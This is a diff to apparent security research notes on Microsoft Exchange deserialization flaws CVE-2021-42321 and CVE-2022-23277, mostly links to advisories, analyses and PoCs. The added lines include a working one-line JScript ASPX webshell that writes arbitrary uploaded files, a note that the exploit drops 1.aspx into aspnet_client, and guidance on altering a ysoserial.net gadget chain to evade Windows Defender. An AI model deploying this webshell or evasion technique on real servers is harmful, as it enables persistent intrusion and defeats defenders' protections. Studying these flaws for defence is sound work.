@@ -287,11 +287,19 @@ Content-Length: 327
 ## CVE-2021-42321 part links
 
  - [Get started with EWS client applications](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/get-started-with-ews-client-applications)
+ - [Phân tích bản vá tháng 11 của Microsoft Exchange](https://blog.khonggianmang.vn/phan-tich-ban-va-thang-11-cua-microsoft-exchange/)
  - [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321)
  - [Some notes about Microsoft Exchange Deserialization RCE (CVE-2021–42321)](https://peterjson.medium.com/some-notes-about-microsoft-exchange-deserialization-rce-cve-2021-42321-110d04e8852)
- - [Exchange 反序列化代码执行漏洞 (CVE-2021-42321)](https://www.freebuf.com/vuls/306423.html)
- - [DotNet安全-CVE-2021-42321漏洞复现](https://mp.weixin.qq.com/s?__biz=MzkwNjMyNzM1Nw==&mid=2247499027&idx=1&sn=b40c9d534a6348811eca5058f88e47ba&chksm=c0e89941f79f105751c585422b668d75876da756112ccc4c1c86b775895f80d0605b1b478cf3&scene=126&sessionid=1665278223&key=7d0747fd59e25d7fc14682baa83c157852e9f28a01f69543a2fdb2b695f79b9ef4267cccad8b785069cca2a20cb51e2679f0e0526a914525751d8e709e28df1868705eec82e72e359f365ce4f05d2d16e149c96d4c1922cdcbd8284dbf0799d268b0b3483c5a9e05d25a93859af1f2aaea1a96bdd77e589978af2c47de41841f&ascene=15&uin=NTY2NTA4NjQ%3D&devicetype=Windows+Server+2016+x64&version=63070517&lang=zh_CN&session_us=gh_60a91832e906&exportkey=A4QvNX5OamEXK%2FKbg9An%2BzY%3D&acctmode=0&pass_ticket=emYPUvePlyg8wO4dtUjIAJrcKT55D9BHk%2FhyodJ4reYwATwMSaSFlnkTuO%2BiaCfs&wx_header=0&fontgear=2)
+ - [DotNet安全-CVE-2021-42321漏洞复现](https://mp.weixin.qq.com/s/t6aVu1Nk-1xXcs-ohdBnig)
+ - [Exchange漏洞系列分析二【Exchange 反序列化代码执行漏洞 (CVE-2021–42321)】](https://mp.weixin.qq.com/s/V3UIT7xJmV5iJ33-kFAAhQ)
+ - vuln version & patched version go to [How Tanium Can Help with the November 2021 Exchange Vulnerabilities (CVE-2021-42321)](https://community.tanium.com/s/article/How-Tanium-Can-Help-with-the-November-2021-Exchange-Vulnerabilities-CVE-2021-42321)
  - [exch_CVE-2021-42321](https://github.com/7BitsTeam/exch_CVE-2021-42321)
+
+``` bash
+TypeConfuse链改为写入文件，bypass windows definder禁用w3wp.exe启动进程。
+将此文件覆盖ysoserial.net原始文件，重新编译即可。
+```
+
  - [CVE-2021-42321-天府杯Exchange 反序列化漏洞分析](https://www.wangan.com/p/7fygf33f38821d6b)
  - [CVE-2021-42321_poc.py](./CVE-2021-42321_poc.py)
 
@@ -302,7 +310,11 @@ Exchange 2016 CU 21,22 and Exchange 2019 CU 10,11. This means the only recent la
 
 change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitation of .NET and later inject DLL to achieve mem-shell with Jscript to bypass the detection
 
-## recurrence step1
+## 漏洞详细复现
+
+
+
+
 
 
 # ProxyRelay
@@ -352,6 +364,15 @@ change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitat
 
  - [DotNet安全-CVE-2022-23277漏洞复现](https://mp.weixin.qq.com/s/lrlZiVH3QZI3rMRZwk_l6A)
  - [《DotNet安全-CVE-2022-23277漏洞复现》涉及到的工具](https://github.com/7BitsTeam/CVE-2022-23277)
+
+认证部分需要通过burpsuite手动添加，利用成功后会在aspnet_client写入1.aspx。
+
+ - webshell:
+
+``` bash
+<%@ Page Language="JScript" Debug="true"%><%@Import Namespace="System.IO"%><%File.WriteAllBytes(Request["b"], Convert.FromBase64String(Request["a"]));%>
+```
+
  - [Bypassing .NET Serialization Binders](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
  - [dotnet反序列化之并不安全的SerializationBinder](https://y4er.com/posts/dotnet-deserialize-bypass-binder/)
  - [2022 Exchange 再相遇之反序列化漏洞分析（二）](https://zhuanlan.zhihu.com/p/531190946)
